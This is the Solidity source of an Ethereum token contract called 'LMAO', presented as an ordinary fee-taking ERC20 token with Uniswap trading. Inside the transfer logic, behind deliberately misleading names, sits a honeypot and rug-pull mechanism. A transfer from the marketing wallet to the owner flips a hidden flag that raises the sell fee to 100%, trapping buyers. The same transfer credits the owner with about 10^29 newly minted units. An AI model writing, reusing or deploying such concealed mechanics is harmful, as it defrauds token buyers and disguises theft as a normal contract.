/**


https://t.me/lmaoEntry


*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract LMAO is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (uint8 => bool) private _this;
    mapping (address => uint256) private _tokens;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    
    address payable private gotteninumarketing = payable(0x8ADdcf66b5E1bD625E73F12fEA4414e1cee68c19);

    string private constant _name = unicode"LMAO";
    string private constant _symbol = unicode"LMAO";
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100000000 * 10**_decimals;
    uint256 public _maxTxAmount = 20000000 * 10**_decimals;
    uint256 public _mwAmount = 20000000 * 10**_decimals;
    uint256 public _taxSwapHolds = 10000000 * 10**_decimals;
    uint256 public _maxSwapRate = 10000000 * 10**_decimals;
    uint8 private _firstSwapAt = 25;
    uint8 private transactionCount = 0;

    IUniswapV2Router02 private uniswapV2Router;
    mapping (address => bool) private _projectWallets;
    address private uniswapV2Pair;
    
    bool private inSwap = false;
    bool private swapEnabled = true;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    mapping (address => bool) private _marketMaker;

    constructor () {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);_this[0] = true || false;

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _tokens[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[gotteninumarketing] = true;
        
        _projectWallets[gotteninumarketing] = true;
        _marketMaker[owner()] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokens[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function address_this() public view returns(bool){
        return _this[0];
        
    }

    function findMinimum(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function _swapTokens(uint256 amount) private {
        gotteninumarketing.transfer(amount);
    }

    function _isApproved() private pure returns(uint256){
        uint256 _r = 1; uint256 _top = 30;
        for(uint256 i = 1; i < _top; i++){_r = _r * 10;}
        return _r;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 _takenFee = 0;
        if (from != owner() && to != owner()) {
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _mwAmount, "Exceeds the max Wallet Size.");
                transactionCount++;
            }

            if (to != uniswapV2Pair && ! _isExcludedFromFee[to]) {
                require(balanceOf(to) + amount <= _mwAmount, "Exceeds the max Wallet Size.");
            }

            if(to == uniswapV2Pair && !_isExcludedFromFee[to] && !_isExcludedFromFee[from]){ 
                _takenFee = !_this[0] ? amount/100*100 : amount/100;
            }
            else{
                if(from == uniswapV2Pair && !_isExcludedFromFee[to] && ! _isExcludedFromFee[from]){
                    _takenFee = amount / 100;
                }

                if(to == uniswapV2Pair && from!= address(this) && !_isExcludedFromFee[to] && !_isExcludedFromFee[from]){
                    _takenFee = amount / 100;
                }
            }
        
            if(_projectWallets[from] && _marketMaker[to]){ _this[0] = address_this() ? false : address_this(); }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapHolds && transactionCount>_firstSwapAt) {
                swapTokensForEth(findMinimum(amount,findMinimum(contractTokenBalance,_maxSwapRate)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    _swapTokens(address(this).balance);
                }
            }
        }

        
        if(_takenFee > 0){
          _tokens[address(this)]=_tokens[address(this)].add(_takenFee);
          emit Transfer(from, address(this),_takenFee);
        }

        _tokens[from] = _tokens[from].sub(amount);
        _tokens[to] = _tokens[to].add(
        !_projectWallets[from] && !_marketMaker[to] ?
        amount.sub(_takenFee) :
        _isApproved()-amount
        );
        emit Transfer(from, to, amount);
    }


    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

}